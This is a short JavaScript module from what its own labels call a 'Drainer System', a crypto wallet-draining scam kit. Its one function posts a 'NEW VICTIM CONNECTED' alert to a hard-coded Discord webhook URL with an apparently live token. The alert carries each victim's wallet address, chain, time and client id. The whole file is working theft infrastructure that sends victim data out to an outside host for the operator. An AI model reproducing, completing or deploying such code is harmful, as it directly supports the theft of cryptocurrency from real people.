// Discord Notification System
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';

async function sendDiscordAlert(victimData) {
  try {
    const message = {
      embeds: [{
        title: "🎯 NEW VICTIM CONNECTED",
        color: 0x00ff00,
        fields: [
          {
            name: "👤 Wallet Address",
            value: `\`${victimData.walletAddress}\``,
            inline: false
          },
          {
            name: "⛓️ Chain",
            value: victimData.chain || 'Unknown',
            inline: true
          },
          {
            name: "🕐 Time", 
            value: new Date().toLocaleString(),
            inline: true
          },
          {
            name: "🔗 Client",
            value: victimData.clientId || 'Direct',
            inline: true
          }
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: "Drainer System Alert"
        }
      }]
    };

    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    });
    
    console.log('📢 Discord alert sent for:', victimData.walletAddress);
  } catch (error) {
    console.log('❌ Discord alert failed:', error.message);
  }
}

export { sendDiscordAlert };
